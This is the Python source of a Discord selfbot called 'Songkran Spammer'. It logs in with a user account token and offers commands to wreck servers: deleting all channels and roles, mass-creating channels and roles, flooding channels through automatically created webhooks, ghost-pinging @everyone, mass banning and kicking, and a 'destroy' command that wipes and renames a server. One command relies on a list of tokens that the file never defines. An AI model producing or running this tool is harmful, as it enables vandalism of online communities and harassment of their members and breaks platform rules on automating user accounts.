import requests
from websocket import WebSocket
from concurrent.futures import ThreadPoolExecutor
from json import loads, dumps, load
import random, discord, threading, os, datetime, asyncio
from time import sleep

from colorama import Fore
from discord.ext import (
    commands,
)


with open('config.json') as settings:
    config = load(settings)

color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "

token = config.get('token')
prefix = config.get('prefix')
content = config.get('content')
description = config.get('description')
image_url = config.get('image_url')
webhook_name = config.get('webhook_name')
webhook_title = config.get('webhook_title')
time = datetime.datetime.utcnow()
title_url = config.get('title_url')
icon_url = config.get('icon_url')
avatar_url = config.get('avatar_url')
footer = config.get('embed_footer')


intents = discord.Intents.default()
intents.presences = True
intents.members = True
bot = discord.Client()
bot = commands.Bot(
    description='Selfbot',
    command_prefix=prefix,
    self_bot=True
)    

bot.remove_command('help')

def newpage():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""   
        Discord : https://discord.gg/3hTAnn2AXE    
        NameApp : Spammer Discord
        {prefix}help 1-2
    """) 

def start():
    bot.run(token, bot=False, reconnect=True)

@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CheckFailure):
        pass
    elif isinstance(error, commands.MissingRequiredArgument):
        pass
    elif isinstance(error, discord.errors.Forbidden):
        pass
    elif "Cannot send an empty message" in error_str:
        pass
    else:
        pass

@bot.event
async def on_connect():
    newpage()

def deletechannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass

def deleterole(guild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{roledetails}",headers=headers)
    except:
        pass

def spamrole(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        randcolor = random.randint(0x000000, 0xFFFFFF)
        requests.post(f"https://discord.com/api/v8/guilds/{guild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
    except:
        pass

def textcspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v8/guilds/{guild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

def voicecspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v8/guilds/{guild}/channels",headers=headers,json={"type":"2","name":nameofchan})
    except:
        pass

def spampins(channel, message):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.put(f"https://discord.com/api/v9/channels/{channel}/pins/{message}", headers=headers)
    except:
        pass

def spamedits(channel, messageid, message):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*', 'content-type': 'application/json'}
        requests.patch(f"https://discord.com/api/v9/channels/{channel}/messages/{messageid}", headers=headers, json={"content": message})
    except:
        pass

def spamname(chanid, name):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*', 'content-type': 'application/json'}
        requests.patch(f"https://discord.com/api/v9/channels/{chanid}", headers=headers, json={"name": name})
    except:
        pass

def webspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
          "content": f"{content}",
          "embeds": [
            {
              "title": f"{webhook_title}",
              "tts": "true",
              "description": f"\n{description}",
              "url": f"{image_url}",
              "color": f"{randcolor}",
              "timestamp": f"{time}",
              "author": {
                "name": f"{webhook_name}",
                "url": f"{title_url}",
                "icon_url": f"{icon_url}"
              },
              "footer": {
                "text": f"{footer}",
                "icon_url": f"{icon_url}"
              },
              "image": {
                "url": f"{image_url}"
              }
            }
          ],
          "username": f"{webhook_name}",
          "avatar_url": f"{avatar_url}"
        }
        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass
        elif "rate limited" in spammingerror.lower():
            try:
                j = loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                sleep(delay)
        else:
            delay = random.randint(30, 60)
            sleep(delay)

def live(token, guild_id, chid) :
    global runn
    ws = WebSocket()
    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
    hello = loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
    ws.send(dumps({"op": 4,"d": {"guild_id": guild_id,"channel_id": chid,"self_mute": True,"self_deaf": True}}))
    ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": guild_id,"channel_id": chid,"preferred_region": "singapore"}}))
    while runn:
        sleep(heartbeat_interval/1000)
        try:
            if runn == False:
                runn = True
                break
            ws.send(dumps({"op": 1,"d": None}))
        except Exception:
            break

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = deletechannel, args = (chan.id,)).start() 
        except:
            pass

@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deleterole, args = (ctx.guild.id,rol.id,)).start()

@bot.command()
async def rolespam(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = spamrole, args = (ctx.guild.id,nameofthem,)).start()

@bot.command()
async def textchannelspam(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,nameofthem,)).start()

@bot.command()
async def voicechannelspam(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = voicecspam, args = (ctx.guild.id,nameofthem,)).start()

@bot.command()
async def webhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            webhook =await channel.create_webhook(name=f"{str(webhook_name)}")
            threading.Thread(target = webspam, args = (webhook.url,)).start()

@bot.command()
async def destroy(ctx, amount, *, roname):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            threading.Thread(target = deletechannel, args = (channel.id,)).start() 
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            threading.Thread(target = deleterole, args = (ctx.guild.id,role.id,)).start()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=roname,
            description="Songkran Spammer",
            reason="Songkran Spammer",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,roname,)).start()
    for _i in range(int(amount)):
        threading.Thread(target = spamrole, args = (ctx.guild.id,roname,)).start()

@bot.command()
async def stopwebhook(ctx):
    await ctx.message.delete()
    global spammingdawebhookeroos
    spammingdawebhookeroos = False

@bot.command()
async def ghostpings(ctx, mode, amount):
    await ctx.message.delete()
    if mode == ("all"):
        try:
            for i in range(int(amount)):
                for channel in ctx.guild.text_channels:
                    message = "@everyone"
                    await channel.send(content=message, delete_after=0.1)
        except:
            pass
    elif mode == ("one"):
        try:
            for i in range(int(amount)):
                message = "@everyone"
                await ctx.send(content=message, delete_after=0.1)
        except:
            pass
    else:
        pass

@bot.command()
async def spamreact(ctx, count=None, reaction=None):
    await ctx.message.delete()
    try:
        async for message in ctx.message.channel.history(limit=int(count)):
            try:
                await message.add_reaction(reaction)
            except:
                pass
    except:
        pass

@bot.command()
async def servername(ctx, *, names):
    await ctx.message.delete()
    await ctx.guild.edit(
            name=names,
            description="Songkran Spammer",
            reason="Songkran Spammer",
            icon=None,
            banner=None
        )  

@bot.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    if ctx.guild == None:
        pass
    else:
        servername = ctx.guild.name
        servercreateat = ctx.guild.created_at.strftime("%a, %d %b %Y %I:%M %p")
        serverid = ctx.guild.id
        serverregion = ctx.guild.region
        boostlevel = ctx.guild.premium_tier
        boostcount = ctx.guild.premium_subscription_count
        rolecount = len(ctx.guild.roles)
        categorycount = len(ctx.guild.categories)
        textchancount = len(ctx.guild.text_channels)
        voicechancount = len(ctx.guild.voice_channels)
        totalmember = ctx.guild.member_count
        message = (f"""
{space}servername  : {servername}
{space}create at  : {servercreateat}
{space}server id  : {serverid}
{space}server region  : {serverregion}
{space}boost level  : level {boostlevel}
{space}boost count  : {boostcount} boost
{space}role count  : {rolecount} roles
{space}category count  : {categorycount} category
{space}text channel count  : {textchancount} channels
{space}voice channel count  : {voicechancount} channels
{space}total member  : {totalmember} people
""")
        newpage()
        print(message)

@bot.command()
async def servercopy(ctx):
    await ctx.message.delete()
    name = f'copy-{ctx.guild.name}'
    await bot.create_guild(name)
    await asyncio.sleep(4)
    for g in bot.guilds:
        if name in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@bot.command()
async def spampin(ctx, mode, channel_id, count):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=int(count)):
        if mode == ("api"):
            try:
                threading.Thread(target = spampins, args = (channel_id,message.id,)).start()
            except:
                pass
        elif mode == ("normal"):
            try:
                await message.pin()
            except:
                pass
        else:
            pass

@bot.command()
async def spamedit(ctx, mode, channel_id, count=None,*, msg=None):
    await ctx.message.delete()
    async for message in ctx.channel.history(limit=int(count)):
        if mode == ("normal"):
            try:
                if message.author == bot.user:
                    await message.edit(content=msg,embed=None)
            except:
                pass
        elif mode == ("api"):
            try:
                threading.Thread(target = spamedits, args = (channel_id,message.id,msg)).start()
            except:
                pass

@bot.command()
async def banid(ctx, userid, days):
    await ctx.message.delete()
    if days == ("1"):
        mes = 1
    elif days == ("7"):
        mes = 7
    elif days == ("0"):
        mes = 0
    else:
        mes = 1
    try:
        requests.put(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/bans/{userid}",headers = {
            'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*'}, json={
                'reason': None, 'delete_message_days': mes
            })
    except:
        pass

@bot.command()
async def kickid(ctx, userid, reason):
    await ctx.message.delete()
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/{userid}?reason=",headers = {
            'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*', 'content-type': 'application/json'}, json={
                'reason': reason
            })
    except:
        pass

@bot.command()
async def spamchannelname(ctx, name):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = spamname, args = (chan.id,name)).start()
        except:
            pass

@bot.command()
async def livestream(ctx, guilid, chid, amount):
    await ctx.message.delete()
    a = 0
    for token in tokenlist:
        if a == int(amount):
            break
        executor.submit(live, token, guilid, chid)
        a+=1

@bot.command()
async def stoplivestream(ctx):
    await ctx.message.delete()
    global runn
    runn = False

@bot.command()
async def cls(ctx):
    await ctx.message.delete()
    newpage()

@bot.command()
async def help(ctx ,page=None):
    await ctx.message.delete()
    help = f"""
{space}1.) {prefix}textchannelspam (amount) (name) - Spam Creats A Text Channels
{space}2.) {prefix}voicechannelspam (amount) (name) - Spam Creats A Voice Channels
{space}3.) {prefix}spamchannelname (name) - Rename All Channels
{space}4.) {prefix}delchannels - Delete Most Channels
{space}5.) {prefix}rolespam (amount) (name) - Spam Creates A Roles
{space}6.) {prefix}delroles - Delete Most Roles
{space}7.) {prefix}webhookspam - Webhook Spam
{space}8.) {prefix}stopwebhook- Stop Webhook Spam
{space}9.) {prefix}destroy (amount) (name) - destroy the server
{space}10.) {prefix}ghostpings (one,all) (amount) - Tag Everyone Invisibles"""
    help2 = f"""
{space}11.) {prefix}banid (user_id) (1,7 Days or 0 = Forever)- Ban From Server With Id And User
{space}12.) {prefix}kickid (user_id) (reason)- Kick From Server With Id And USer
{space}13.) {prefix}servername (name) - Change Server Name
{space}14.) {prefix}serverinfo - Biew Information About The Server
{space}15.) {prefix}servercopy - Copy Server
{space}16.) {prefix}spamreact (amount) (reaction) - spam reaction
{space}17.) {prefix}spampin (api,normal) (channel_id) (amount) - spam pinned messages
{space}18.) {prefix}spamedit (api,normal) (channel_id) (amount) (message) - message edit spam
{space}19.) {prefix}cls - clear terminal"""
    if page == None:
        newpage()
        print(help)
    elif page == ("1"):
        newpage()
        print(help)
    elif page == ("2"):
        newpage()
        print(help2)
    else:
        pass

start()
